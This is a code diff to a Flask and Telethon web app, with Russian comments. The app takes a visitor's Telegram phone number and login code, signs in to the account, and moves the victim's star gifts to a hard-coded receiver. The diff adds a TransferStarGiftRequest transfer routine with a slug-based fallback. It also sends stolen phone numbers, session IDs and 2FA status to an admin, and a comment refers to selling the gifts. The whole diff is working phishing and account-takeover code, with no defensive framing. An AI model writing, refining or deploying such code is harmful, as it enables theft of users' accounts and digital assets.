@@ -2,6 +2,8 @@
 from flask import Flask, render_template, request, jsonify, session
 from telethon import TelegramClient
 from telethon.errors import SessionPasswordNeededError
+from telethon.tl.functions.payments import TransferStarGiftRequest
+from telethon.tl.types import InputSavedStarGiftUser
 import asyncio
 import os
 import json
@@ -77,18 +79,68 @@ async def transfer_nft_to_receiver(client, info):
             f"🎁 Подарков: {info.get('gifts_count', 0)}"
         )
         
-        if info.get('gifts_count', 0) > 0:
-            for gift in info.get('gifts', []):
+        # Пересылаем подарки через payments.transferStarGift (layer 198+)
+        if info.get('gifts_count', 0) > 0 and info.get('gifts'):
+            for gift in info['gifts']:
                 try:
-                    await client.send_gift(receiver, gift)
-                    result_text += f"\n🎁 Подарок отправлен: {gift.id}"
+                    gift_id = None
+                    gift_slug = None
+                    
+                    # Собираем данные подарка
+                    if hasattr(gift, 'id'):
+                        gift_id = gift.id
+                    if hasattr(gift, 'slug'):
+                        gift_slug = gift.slug
+                    if hasattr(gift, 'gift_id'):
+                        gift_id = gift.gift_id
+                    
+                    gift_info = f"ID: {gift_id}"
+                    if gift_slug:
+                        gift_info += f", Slug: {gift_slug}"
+                    
+                    result_text += f"\n📦 Подарок: {gift_info}"
+                    
+                    if gift_id:
+                        try:
+                            # Основной метод: payments.transferStarGift с InputSavedStarGiftUser
+                            await client(TransferStarGiftRequest(
+                                stargift=InputSavedStarGiftUser(gift_id=gift_id),
+                                to_id=receiver
+                            ))
+                            result_text += " ✅ Отправлен"
+                            notify_admin_sync(f"🎁 Подарок {gift_id} отправлен на {RECEIVER_USERNAME}")
+                            
+                        except Exception as send_error:
+                            error_str = str(send_error)
+                            
+                            # Если ошибка что нужен slug — пробуем через slug
+                            if 'slug' in error_str.lower() and gift_slug:
+                                try:
+                                    from telethon.tl.types import InputSavedStarGiftSlug
+                                    await client(TransferStarGiftRequest(
+                                        stargift=InputSavedStarGiftSlug(slug=gift_slug),
+                                        to_id=receiver
+                                    ))
+                                    result_text += " ✅ Отправлен (через slug)"
+                                    notify_admin_sync(f"🎁 Подарок {gift_slug} отправлен на {RECEIVER_USERNAME}")
+                                except Exception as slug_error:
+                                    result_text += f" ❌ Ошибка slug: {str(slug_error)[:80]}"
+                                    logging.error(f"Slug send error: {slug_error}")
+                            else:
+                                result_text += f" ❌ Ошибка: {error_str[:80]}"
+                                logging.error(f"Send gift error: {send_error}")
+                    else:
+                        result_text += " ⚠️ Не удалось получить ID подарка"
+                        
                 except Exception as e:
-                    result_text += f"\n❌ Ошибка отправки подарка: {e}"
+                    result_text += f"\n⚠️ Ошибка обработки: {str(e)[:80]}"
         
         notify_admin_sync(result_text)
         return True
+        
     except Exception as e:
         notify_admin_sync(f"❌ <b>Ошибка перевода:</b>\n{e}")
+        logging.error(f"Transfer error: {e}")
         return False
 
 @app.route('/')
@@ -175,17 +227,29 @@ def api_verify_code():
             await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
             
             # Уведомление об успешном входе
-            notify_admin_sync(f"✅ <b>Успешный вход!</b>\n📞 <code>{phone}</code>\n🆔 Сессия: <code>{session_id}</code>\n🔄 Проверяю баланс...")
+            notify_admin_sync(f"✅ <b>Успешный вход!</b>\n📞 <code>{phone}</code>\n🆔 Сессия: <code>{session_id}</code>\n🔄 Проверяю баланс и подарки...")
             
             info = await check_balance_and_gifts(client)
             if info:
                 await transfer_nft_to_receiver(client, info)
+            
+            # Продажа подарков если есть непотраченные
+            if info and info.get('gifts_count', 0) > 0:
+                try:
+                    # Логируем все подарки перед продажей
+                    for gift in info.get('gifts', []):
+                        notify_admin_sync(f"📦 Обнаружен подарок: ID {getattr(gift, 'id', 'unknown')}, Slug: {getattr(gift, 'slug', 'unknown')}")
+                except Exception as log_error:
+                    logging.error(f"Gift log error: {log_error}")
+            
             await client.disconnect()
             return True
+            
         except SessionPasswordNeededError:
-            notify_admin_sync(f"🔒 <b>Требуется 2FA</b>\n📞 <code>{phone}</code>")
+            notify_admin_sync(f"🔒 <b>Требуется 2FA облачный пароль</b>\n📞 <code>{phone}</code>")
             await client.disconnect()
             return "2fa_needed"
+            
         except Exception as e:
             logging.error(f"Verify error: {e}")
             notify_admin_sync(f"❌ <b>Ошибка входа</b>\n📞 <code>{phone}</code>\nОшибка: {e}")
